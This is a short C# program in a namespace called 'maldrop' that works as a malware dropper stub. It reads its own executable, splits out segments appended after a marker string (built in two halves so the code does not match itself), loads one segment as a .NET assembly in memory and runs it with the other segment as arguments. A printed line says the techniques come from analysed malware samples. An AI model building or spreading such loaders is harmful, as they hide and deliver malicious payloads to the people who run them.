using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;
using System.Text;

namespace maldrop
{
    static class Program
    {
        static bool CompareOffset(byte[] arr, int off, byte[] pattern)
        {
            for (int i = 0; i < pattern.Length; ++i)
                if (arr[off + i] != pattern[i])
                    return false;
            return true;
        }

        static byte[][] SplitByteArray(byte[] arr, byte[] splitPattern)
        {
            int offset = 0;
            List<byte[]> collection = new List<byte[]>();

            for (int i = 0; i < arr.Length - splitPattern.Length; ++i)
            {
                if (CompareOffset(arr, i, splitPattern))
                {
                    collection.Add(arr.Skip(offset).Take(i - offset).ToArray());
                    offset = i + splitPattern.Length;
                    i += splitPattern.Length - 1;
                }
            }
            collection.Add(arr.Skip(offset).ToArray());

            return collection.ToArray();
        }

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("All the techniques implemented in this were found in malware samples I analyzed");;
            string s = Assembly.GetEntryAssembly().Location;
            var baseExe = File.ReadAllBytes(s);
            string split = "[SPLIT";
            string erator = "ERATOR]";
            var res = SplitByteArray(baseExe, Encoding.ASCII.GetBytes(split + erator));

            List<string> arg = new List<string>();
            for (int i = 0; i < res[2].Length; ++i)
                arg.Add(res[2][i].ToString());

            Assembly.Load(res[1])
                .EntryPoint.Invoke(null, new object[] {
                    arg.ToArray()
                });
        }
    }
}
